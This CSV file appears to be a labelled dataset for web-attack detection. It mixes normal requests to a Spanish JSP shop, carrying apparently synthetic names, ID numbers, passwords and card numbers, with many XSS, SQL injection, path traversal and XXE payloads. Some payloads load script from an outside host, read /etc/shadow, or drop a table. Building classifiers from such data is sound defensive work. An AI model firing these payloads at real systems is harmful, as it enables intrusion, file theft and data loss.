payload,type
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\{FILE},traversal
miembros/salir.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"""><script>alert(""XSS by \nxss"")</script>><marquee><h1>XSS by xss</h1></marquee>",xss
global/titulo.jsp,normal
"'';!--""<XSS>=&{()}",xss
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",xss
global/titulo.jsp,normal
imagenes/nuestratierra.jpg,normal
%2e%2e\%2e%2e\{FILE},traversal
"<object onError object onError=""javascript:javascript:alert(1)""></object onError>",xss
miembros/editar.jsp?modo=registro&login=leyden&password=c96revEidil5&nombre=Delia&apellidos=Busoms+Redolad&email=eyre9%40ringringcargo.tn&dni=41022572W&direccion=Las+Palmeras+91+5B&ciudad=Oca%F1a&cp=29691&provincia=Murcia&ntc=9830070914840932&B1=Registrar,normal
or 1=1,sqli
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=49&B1=A%F1adir+al+carrito,normal
global/creditos.jsp,normal
imagenes/2.gif,normal
imagenes/cmenbul.gif,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
global/menum.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/productos.jsp,normal
miembros/editar.jsp?modo=registro&login=plater-z&password=aSOn0nTE&nombre=Mara&apellidos=Nardi+Borgu%F1a&email=nakadai_newell%40intercambioenlaces.tn&dni=16650765F&direccion=Antelo+y+Mari%F1o%2C+192%2C+&ciudad=San+Vicente+de+la+Barquera&cp=12182&provincia=C%E1ceres&ntc=7855531412363120&B1=Registrar,normal
miembros/imagenes/zarauz.jpg,normal
miembros/index.jsp,normal
imagenes/1.gif,normal
global/titulo.jsp,normal
<script language='javascript' src='%(jscript)s'></script>,xss
./.././.././.././.././.././.././.././../{FILE},traversal
publico/caracteristicas.jsp?id=1,normal
miembros/imagenes/ogono.jpg,normal
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},traversal
miembros/imagenes/castro.jpg,normal
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=41&B1=A%F1adir+al+carrito,normal
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=25&B1=A%F1adir+al+carrito,normal
miembros/imagenes/zarauz.jpg,normal
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',xss
"ABC<div style=""x:\xE2\x80\x82expression(javascript:alert(1)"">DEF",xss
publico/productos.jsp,normal
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE},traversal
"<STYLE>.XSS{background-image:url(""javascript:javascript:alert(1)"");}</STYLE><A CLASS=XSS></A>",xss
"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",xss
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal
publico/pagar.jsp?modo=insertar&precio=8285&B1=Pasar+por+caja,normal
imagenes/logo.gif,normal
"s{UEf: select * from users where id=1 or 1#""{ union select version(),version() -- 1",sqli
%2A%28%7C%28objectclass%3D%2A%29%29,sqli
publico/carrito.jsp,normal
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",xss
publico/carrito.jsp,normal
XSS STYLE=xss:e/**/xpression(alert('XSS'))>,xss
%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
imagenes/3.gif,normal
miembros/editar.jsp?modo=registro&login=trevetha&password=.32l6152v0%F1o&nombre=Leonella&apellidos=Sintes+Gasd%E9&email=janisch4%40ebaz.museum&dni=34336341D&direccion=Escritor+Miguel+Delibes+0%2C+7%3FB&ciudad=Cantalejo&cp=33825&provincia=Lleida&ntc=6358756406474802&B1=Registrar,normal
global/menum.jsp,normal
imagenes/nuestratierra.jpg,normal
publico/productos.jsp,normal
<BODY ONLOAD=alert('hellox worldss')>,xss
global/menum.jsp,normal
global/estilos.css,normal
publico/autenticar.jsp?modo=entrar&login=claudine&pwd=arrestar&remember=off&B1=Entrar,normal
<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>,xss
..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE},traversal
"`""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",xss
miembros/index.jsp,normal
publico/carrito.jsp,normal
index.jsp,normal
%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
global/creditos.jsp,normal
miembros/imagenes/castro.jpg,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=92&B1=A%F1adir+al+carrito,normal
global/creditos.jsp,normal
"<IMG SRC=x onpopstate=""alert(String.fromCharCode(88,83,83))"">",xss
imagenes/1.gif,normal
index.jsp,normal
publico/registro.jsp?modo=registro&login=natver&password=apoderado&nombre=Bienvenido&apellidos=Tonche+Mej%EDa&email=yepes%40enla.mg&dni=57955652E&direccion=C%2F+Montealegre+S%2FN%2C+9-B&ciudad=Realejos%2C+Los&cp=19192&provincia=%C1vila&ntc=1193655475933803&B1=Registrar,normal
1,sqli
' or '1'='1'--,sqli
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/cmenbul.gif,normal
"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",xss
index.jsp,normal
"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript:alert('XSS');\"">",xss
miembros/salir.jsp,normal
%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE},traversal
"s&n1U: select * from users where id='1' or $ 1=1 union select 1,@@VERSION -- 1'",sqli
%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal
<--`<img/src=` onerror=alert(1)> --!>,xss
"<XSS STYLE=""behavior: url(%(htc)s);"">",xss
<img src ?itworksonchrome?\/onerror = alert(1),xss
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>,xss
..\..\..\..\{FILE},traversal
"s:os: select * from users where id=1 or "":%"" or 1=1 -- 1",sqli
publico/carrito.jsp,normal
miembros/imagenes/zarauz.jpg,normal
"o..UE: select * from users where id=1<@.. union select 1,version() -- 1",sqli
publico/pagar.jsp?modo=insertar&precio=5031&B1=Confirmar,normal
"<a href=""\xE2\x80\x84javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
(sqlattempt2),sqli
imagenes/3.gif,normal
\x3c,xss
publico/autenticar.jsp?modo=entrar&login=pelland&pwd=sedero&remember=off&B1=Entrar,normal
"<style onLoad style onLoad=""javascript:javascript:alert(1)""></style onLoad>",xss
C:\inetpub\wwwroot\global.asa,traversal
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=79&B1=A%F1adir+al+carrito,normal
publico/caracteristicas.jsp?id=1,normal
%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,traversal
imagenes/1.gif,normal
miembros/index.jsp,normal
publico/registro.jsp?modo=registro&login=verde&password=er6%E1til&nombre=Jamil&apellidos=Men%E9ndez+Coyoma&email=hammong4%40asyra.st&dni=99745017C&direccion=Paseo+Francisco+Mir+Berlanga+141%2C+12-E&ciudad=Riudellots+de+la+Selva&cp=40352&provincia=%C1vila&ntc=9448799154735544&B1=Registrar,normal
global/titulo.jsp,normal
publico/autenticar.jsp?modo=entrar&login=sile&pwd=banqueta&remember=on&B1=Entrar,normal
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,xss
miembros/imagenes/ogono.jpg,normal
publico/productos.jsp,normal
imagenes/2.gif,normal
miembros/imagenes/castro.jpg,normal
"""`'><script>\xE2\x80\x84javascript:alert(1)</script>",xss
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xee;</foo>",xss
imagenes/3.gif,normal
"<div style=""background-image: url(javascript:document.vulnerable=true;);"">",xss
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",xss
"s\c: select * from users where id=1 or ""\#"" or 1=1 -- 1",sqli
global/menum.jsp,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=15&B1=A%F1adir+al+carrito,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/pagar.jsp?modo=insertar&precio=5290&B1=Confirmar,normal
imagenes/logo.gif,normal
........................................................................../../../../../../../{FILE},traversal
publico/miembros.jsp,normal
miembros/index.jsp,normal
publico/miembros.jsp,normal
publico/caracteristicas.jsp?id=2,normal
"<div id=d><div style=""font-family:'sans\27\3B color\3Ared\3B'"">X</div></div> <script>with(document.getElementById(""d""))innerHTML=innerHTML</script>",xss
publico/carrito.jsp,normal
global/titulo.jsp,normal
publico/carrito.jsp,normal
global/titulo.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
global/estilos.css,normal
"<a href=""\x04javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
miembros/index.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/pagar.jsp?modo=insertar&precio=1102&B1=Pasar+por+caja,normal
global/creditos.jsp,normal
imagenes/cmenbul.gif,normal
publico/productos.jsp,normal
miembros/imagenes/castro.jpg,normal
&lt;? echo('&lt;SCR)';,xss
publico/carrito.jsp,normal
"s)v: select * from users where id=1 or "")@"" or 1=1 -- 1",sqli
miembros/editar.jsp?modo=registro&login=wenzel&password=borrica&nombre=Mar%EDa+de+Aranz%FA&apellidos=Moretti+Alegre&email=terry%40mtos.ar&dni=56546514W&direccion=Rua+Bamio%2C+190+11%3FH&ciudad=Pelarrodr%EDguez&cp=43550&provincia=Lleida&ntc=0947549871262969&B1=Registrar,normal
publico/caracteristicas.jsp?id=1,normal
imagenes/logo.gif,normal
miembros/salir.jsp,normal
%2e%2e/%2e%2e/%2e%2e/{FILE},traversal
<;SCRIPT>;a=/XSS/,xss
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
imagenes/logo.gif,normal
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,traversal
imagenes/logo.gif,normal
miembros/imagenes/castro.jpg,normal
miembros/fotos.jsp,normal
publico/autenticar.jsp?modo=entrar&login=deloria&pwd=rancar&remember=off&B1=Entrar,normal
imagenes/nuestratierra.jpg,normal
publico/miembros.jsp,normal
&#X0003C;,xss
publico/registro.jsp?modo=registro&login=dziawa&password=chaScaR&nombre=Tromen&apellidos=Pecell%EDn&email=cary-whitten%40magritte.pe&dni=42836631M&direccion=Calle+Colon+De+Larreategui+48%2C+&ciudad=Llub%ED&cp=36683&provincia=Salamanca&ntc=5690251194310555&B1=Registrar,normal
publico/carrito.jsp,normal
miembros/imagenes/castro.jpg,normal
miembros/imagenes/ogono.jpg,normal
global/creditos.jsp,normal
<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,xss
global/titulo.jsp,normal
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,xss
miembros/fotos.jsp,normal
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\{FILE},traversal
imagenes/nuestratierra.jpg,normal
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E,xss
'sqlattempt1,sqli
"<body background=javascript:'""><script>alert(navigator.userAgent)</script>></body>",xss
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
"</textarea>'""><script>alert(document.cookie)</script>",xss
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,xss
%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
<svg><script onlypossibleinopera:-)> alert(1),xss
"""hi"""") or (""""a""""=""""a""",sqli
"<IMG SRC=x onbeforeprint=""alert(String.fromCharCode(88,83,83))"">",xss
index.jsp,normal
publico/autenticar.jsp?modo=entrar&login=vispy&pwd=2u17z0o&remember=off&B1=Entrar,normal
imagenes/nuestratierra.jpg,normal
miembros/index.jsp,normal
imagenes/nuestratierra.jpg,normal
miembros/editar.jsp?modo=registro&login=trinidad&password=b%E9lgico&nombre=Dalal&apellidos=Manent+Niub%F3&email=chinaphan%40viajesdacapalla.eh&dni=93640511J&direccion=C%2F+Ca%F1amaque%2C+15%2C+4-G&ciudad=Brihuega&cp=09258&provincia=Valencia&ntc=2875307129391244&B1=Registrar,normal
miembros/index.jsp,normal
imagenes/nuestratierra.jpg,normal
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
imagenes/1.gif,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/3.gif,normal
..\..\..\..\..\..\..\..\..\..\boot.ini,traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/1.gif,normal
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
' ; drop table temp --,sqli
miembros/imagenes/zarauz.jpg,normal
publico/caracteristicas.jsp?id=2,normal
"&lt;SCRIPT =\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
publico/productos.jsp,normal
miembros/salir.jsp,normal
miembros/editar.jsp?modo=registro&login=calleja&password=9u5es2v83ent2&nombre=Tila&apellidos=Acurio+Bayona&email=wessell.georg%40smalltec.md&dni=83360974G&direccion=Calle+La+Rambla+S%2FN+4%3FD&ciudad=Taravilla&cp=44143&provincia=A+Coru%F1a&ntc=9019896710304929&B1=Registrar,normal
"""`'><script>\x0Bjavascript:alert(1)</script>",xss
miembros/editar.jsp?modo=registro&login=valle&password=EsTIVaL&nombre=Zanobia&apellidos=Arajol+Lo+Cascio&email=merande%40icodea.va&dni=48064800K&direccion=Estrecho+De+Ormuz+62%2C+7-G&ciudad=Nieva+de+Cameros&cp=06380&provincia=Valladolid&ntc=2800093230018510&B1=Registrar,normal
"<a href=""\x06javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
miembros/imagenes/ogono.jpg,normal
miembros/imagenes/castro.jpg,normal
%2e%2e%5c{FILE},traversal
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
s&o1&: select * from users where id='1' or \<1 or 1=1 -- 1',sqli
<img src ?itworksonchrome?\/onerror = alert(1),xss
imagenes/nuestratierra.jpg,normal
publico/carrito.jsp,normal
imagenes/3.gif,normal
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;,xss
"s&vvU: select * from users where id='1' or @ @1=1 union select 1,version() -- 1'",sqli
imagenes/nuestratierra.jpg,normal
"admin"" or 1=1#",sqli
%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE},traversal
index.jsp,normal
global/titulo.jsp,normal
global/titulo.jsp,normal
"<DIV STYLE=""width:expression(javascript:alert(1));"">",xss
<<script>document.vulnerable=true;</script>,xss
s&.o&: select * from users where id='1' or \.<\ or 1=1 -- 1',sqli
"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1)"">X",xss
1,sqli
publico/caracteristicas.jsp?id=2,normal
imagenes/1.gif,normal
..%2f..%2f..%2f..%2f{FILE},traversal
<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->,xss
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,traversal
...\...\...\...\{FILE},traversal
global/estilos.css,normal
imagenes/logo.gif,normal
global/estilos.css,normal
"</ foo=""><script>alert(1)</script>"">",xss
"<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1)""></script onReadyStateChange>",xss
"""`'><script>\xE2\x80\x88javascript:alert(1)</script>",xss
"<TD BACKGROUND=""javascript:alert('XSS')"">",xss
publico/miembros.jsp,normal
miembros/imagenes/castro.jpg,normal
publico/productos.jsp,normal
"<IMG SRC=x onseeked=""alert(String.fromCharCode(88,83,83))"">",xss
miembros/salir.jsp,normal
global/estilos.css,normal
"<a href=""\xE2\x80\x82javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
global/menum.jsp,normal
miembros/index.jsp,normal
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=5&B1=A%F1adir+al+carrito,normal
global/menum.jsp,normal
"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",xss
..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025{FILE},traversal
"<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>",xss
global/menum.jsp,normal
global/estilos.css,normal
miembros/index.jsp,normal
"v: select * from users where id=1 + @`\` union select 1,version() -- 1",sqli
publico/registro.jsp?modo=registro&login=gherardo&password=9u55c89cia&nombre=Amine&apellidos=Frontera&email=matthews.russa%40pensionesbaratas.com.bi&dni=70129758K&direccion=Calle+Castellet+94%2C+&ciudad=Salamanca&cp=48710&provincia=Burgos&ntc=9449507239645140&B1=Registrar,normal
publico/carrito.jsp,normal
\u003C,xss
miembros/salir.jsp,normal
"<a href=""\x06javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/1.gif,normal
publico/autenticar.jsp?modo=entrar&login=ralf&pwd=d%FA4S&remember=on&B1=Entrar,normal
"<div style=""font-family:foo}color=red;"">XXX",xss
publico/autenticar.jsp?modo=entrar&login=buddie&pwd=ser%3Fado&remember=off&B1=Entrar,normal
miembros/index.jsp,normal
publico/autenticar.jsp?modo=entrar&login=nessa&pwd=copa&remember=off&B1=Entrar,normal
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
publico/registro.jsp?modo=registro&login=dottin&password=coladiza&nombre=Teobaldo&apellidos=Urbon&email=gomska.hopper%40ebuy.com.bi&dni=75010741J&direccion=Calle+Austria%2C+183+1-C&ciudad=Mierla%2C+La&cp=05147&provincia=Barcelona&ntc=7041334595483221&B1=Registrar,normal
"&lt;A HREF=\""//google\""&gt;XSS&lt;/A&gt;",xss
"<div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X",xss
global/estilos.css,normal
global/titulo.jsp,normal
imagenes/2.gif,normal
"s1UE1: select * from users where id=1 or 1#""1 union select 1,version() -- 1",sqli
son.&: select * from users where id='1' *$ . or 1=1 -- 1',sqli
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal
&#x00003C;,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
imagenes/1.gif,normal
"<a href=""\x17javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<iframe style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",xss
"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='",xss
miembros/fotos.jsp,normal
"<style><img src=""</style><img src=x onerror=alert(XSS)//"">",xss
"""><STYLE>@import""javascript:alert('XSS')"";</STYLE>",xss
publico/autenticar.jsp?modo=entrar&login=haiping&pwd=promanar&remember=on&B1=Entrar,normal
global/creditos.jsp,normal
publico/autenticar.jsp?modo=entrar&login=alexio&pwd=biZarRO&remember=off&B1=Entrar,normal
miembros/imagenes/zarauz.jpg,normal
imagenes/logo.gif,normal
publico/miembros.jsp,normal
<script>alert(1);</script>,xss
imagenes/logo.gif,normal
..\..\..\..\..\{FILE},traversal
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;""></BODY></HTML>",xss
' -- &password=,sqli
global/estilos.css,normal
miembros/index.jsp,normal
publico/miembros.jsp,normal
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",xss
imagenes/3.gif,normal
..//..//..//..//..//..//{FILE},traversal
..\..\\..\{FILE},traversal
imagenes/1.gif,normal
publico/registro.jsp?modo=registro&login=souren&password=P811S25&nombre=Sisebuto&apellidos=Fincias+Alcoriza&email=diccico_pastor%40a%F1o09.io&dni=80914738W&direccion=C%2F+Altamira+179%2C+&ciudad=Almaluez&cp=45789&provincia=Sevilla&ntc=1714562160313645&B1=Registrar,normal
imagenes/logo.gif,normal
publico/pagar.jsp?modo=insertar&precio=1096&B1=Confirmar,normal
imagenes/1.gif,normal
miembros/imagenes/zarauz.jpg,normal
publico/pagar.jsp?modo=insertar&precio=9398&B1=Pasar+por+caja,normal
"<a href=""javascript:javascript:alert(1)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"">",xss
imagenes/cmenbul.gif,normal
global/creditos.jsp,normal
miembros/fotos.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
..//..//..//..//..//..//..//{FILE},traversal
publico/miembros.jsp,normal
miembros/imagenes/ogono.jpg,normal
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},traversal
publico/autenticar.jsp?modo=entrar&login=bergland&pwd=85amo&remember=on&B1=Entrar,normal
<script>javascript:alert(1)<\x00/script>,xss
"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",xss
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=96&B1=A%F1adir+al+carrito,normal
"<svg xmlns=""#""><script>alert(1)</script></svg>",xss
imagenes/3.gif,normal
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/imagenes/castro.jpg,normal
miembros/salir.jsp,normal
/..\/..\/..\/..\/..\/..\{FILE},traversal
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,traversal
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE},traversal
miembros/editar.jsp?modo=registro&login=forslund&password=im%24ponderable&nombre=Ravid&apellidos=Bonany+Lambarri&email=lightnin%40grupodescansoyhogar.web&dni=70679983V&direccion=Calle+Barrio+Villayuda+169%2C+&ciudad=Ari%F1o&cp=08170&provincia=Segovia&ntc=0664227829030755&B1=Registrar,normal
